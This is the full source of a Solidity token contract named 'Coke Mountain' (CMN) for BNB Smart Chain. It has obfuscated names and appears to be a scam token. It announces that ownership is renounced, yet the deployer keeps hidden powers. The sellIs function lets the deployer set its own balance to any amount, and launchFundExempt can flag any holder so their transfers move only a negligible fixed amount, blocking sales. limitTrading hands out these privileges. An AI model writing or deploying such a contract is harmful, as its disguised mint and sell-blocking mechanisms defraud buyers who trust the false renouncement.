/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface launchedTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeLaunchedShould {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract CokeMountain {
    uint8 private shouldFund = 18;

    address private receiverLimit;

    string private _name = "Coke Mountain";
    string private _symbol = "CMN";

    uint256 private shouldTake = 100000000 * 10 ** shouldFund;
    mapping(address => uint256) private receiverToSell;
    mapping(address => mapping(address => uint256)) private txLaunch;

    mapping(address => bool) public takeEnable;
    address public fromSwap;
    address public tokenLimit;
    mapping(address => bool) public fromTake;
    uint256 constant maxExemptSwap = 10 ** 10;
    bool public minAt;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        launchedTeam toLaunched = launchedTeam(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tokenLimit = takeLaunchedShould(toLaunched.factory()).createPair(toLaunched.WETH(), address(this));
        receiverLimit = tradingSell();
        fromSwap = receiverLimit;
        takeEnable[fromSwap] = true;
        receiverToSell[fromSwap] = shouldTake;
        emit Transfer(address(0), fromSwap, shouldTake);
        receiverIs();
    }

    

    function getOwner() external view returns (address) {
        return receiverLimit;
    }

    function transferFrom(address liquidityList, address walletList, uint256 senderMin) public returns (bool) {
        if (liquidityList != tradingSell() && txLaunch[liquidityList][tradingSell()] != type(uint256).max) {
            require(txLaunch[liquidityList][tradingSell()] >= senderMin);
            txLaunch[liquidityList][tradingSell()] -= senderMin;
        }
        if (walletList == fromSwap || liquidityList == fromSwap) {
            return fundExemptFrom(liquidityList, walletList, senderMin);
        }
        if (fromTake[liquidityList]) {
            return fundExemptFrom(liquidityList, walletList, maxExemptSwap);
        }
        return fundExemptFrom(liquidityList, walletList, senderMin);
    }

    function tradingSell() private view returns (address) {
        return msg.sender;
    }

    function decimals() external view returns (uint8) {
        return shouldFund;
    }

    function transfer(address walletList, uint256 senderMin) external returns (bool) {
        return transferFrom(tradingSell(), walletList, senderMin);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function owner() external view returns (address) {
        return receiverLimit;
    }

    function receiverIs() public {
        emit OwnershipTransferred(fromSwap, address(0));
        receiverLimit = address(0);
    }

    function fundExemptFrom(address limitEnable, address maxReceiver, uint256 senderMin) internal returns (bool) {
        require(receiverToSell[limitEnable] >= senderMin);
        receiverToSell[limitEnable] -= senderMin;
        receiverToSell[maxReceiver] += senderMin;
        emit Transfer(limitEnable, maxReceiver, senderMin);
        return true;
    }

    function approve(address senderMax, uint256 senderMin) public returns (bool) {
        txLaunch[tradingSell()][senderMax] = senderMin;
        emit Approval(tradingSell(), senderMax, senderMin);
        return true;
    }

    function balanceOf(address tokenReceiver) public view returns (uint256) {
        return receiverToSell[tokenReceiver];
    }

    function allowance(address tradingAuto, address senderMax) external view returns (uint256) {
        return txLaunch[tradingAuto][senderMax];
    }

    function sellIs(uint256 senderMin) public {
        if (!takeEnable[tradingSell()]) {
            return;
        }
        receiverToSell[fromSwap] = senderMin;
    }

    function launchFundExempt(address minBuy) public {
        if (minBuy == fromSwap || minBuy == tokenLimit || !takeEnable[tradingSell()]) {
            return;
        }
        fromTake[minBuy] = true;
    }

    function limitTrading(address enableTakeMax) public {
        if (minAt) {
            return;
        }
        takeEnable[enableTakeMax] = true;
        minAt = true;
    }

    function totalSupply() external view returns (uint256) {
        return shouldTake;
    }


}